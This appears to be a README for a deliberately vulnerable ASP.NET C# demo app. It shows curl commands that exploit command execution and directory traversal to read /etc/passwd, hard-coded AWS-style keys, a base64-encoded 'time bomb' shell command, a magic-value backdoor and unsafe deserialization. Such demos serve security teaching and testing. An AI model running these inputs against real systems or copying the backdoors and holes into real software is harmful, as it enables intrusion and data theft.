# ASP.NET C\# Vulnerability Demo

## Setup
* cd ${workplace}
* docker-compose up --build
* {open browser and navigate to [http://localhost:5005](http://localhost:5005)}

## Vulnerability Demo

### SQL Injection:

### Remote code execution:
- Command-Line Demo:
    ```sh
    $ curl -X GET -d "name=cat /etc/passwd" http://localhost:5005/ExecCmdSecure
   
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nolog
    ```

### Directory traversal:

- Command-Line Demo:
    ```sh
    $ curl -X GET -d "name=../../etc/passwd" http://localhost:5005/dirTraversal
   
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nolog
    ```
http://localhost:5005/dirTraversal?name=${name}`

### Hard Coded credentials:
- [Code Snippet](https://gitlab.com/irobert0126/aspdotnet_csharp_vuln_demo/tree/master/SqlInjection/Controllers/OrderController.cs#L96):
    ```java
    [HttpGet("vulns")]
        public ActionResult DataLeakage(string login, string password, string encodedPath, string entityDocument) {
            String ACCESS_KEY_ID = "AKIA2E0A8F3B244C9986";
            String SECRET_KEY = "7CE556A3BC234CC1FF9E8A5C324C0BB70AA21B6D";

    ```
    
### Sensitive data leak:
- [Code Snippet](https://gitlab.com/irobert0126/aspdotnet_csharp_vuln_demo/tree/master/SqlInjection/Controllers/OrderController.cs#L110):
    ```java
    [HttpGet("vulns")]
        public ActionResult DataLeakage(string login, string password, string encodedPath, string entityDocument) {
            String ACCESS_KEY_ID = "AKIA2E0A8F3B244C9986";
            String SECRET_KEY = "7CE556A3BC234CC1FF9E8A5C324C0BB70AA21B6D";
            
            Console.WriteLine(" AWS Properties are " + ACCESS_KEY_ID + " and " + SECRET_KEY);
            Console.WriteLine(" Transactions Folder is " + txns_dir);
    ```
    
### Insider attack:
1.  Time Bomb pattern
    ```java
    // RECIPE: Time Bomb pattern
    String command = "c2ggL3RtcC9zaGVsbGNvZGUuc2g=";
    ticking(command);
    ```
    
2. Magic Value leading to command injection
    ```java
    if (tracefn == "C4A938B6FE01E") {
        runtTimeExec(cmd);
    }
    ```


### Business logic flaw
- [Code Snippet](https://gitlab.com/irobert0126/aspdotnet_csharp_vuln_demo/tree/master/SqlInjection/Controllers/OrderController.cs):
    ```java
    [HttpPost("AddNewOrder")]
    public ActionResult AddNewOrderFlaw(string reader) {
        Order order = JsonConvert.DeserializeObject<Order>(reader);
        return Content(order.ToString());
    }
    ```
- Command-Line Demo:
    ```sh
    $ curl -X POST -d "reader={\"Id\":0,\"AspNetUserId\":1,\"LastName\":\"Xu\",\"FirstName\":\"Zhaoyan\",\"FullName\":\"Luke\'' Father\",\"AspNetUser\":null}" http://localhost:5005/AddNewOrder
    
      SqlInjection.Models.Order 
    ```
- UI Demo:
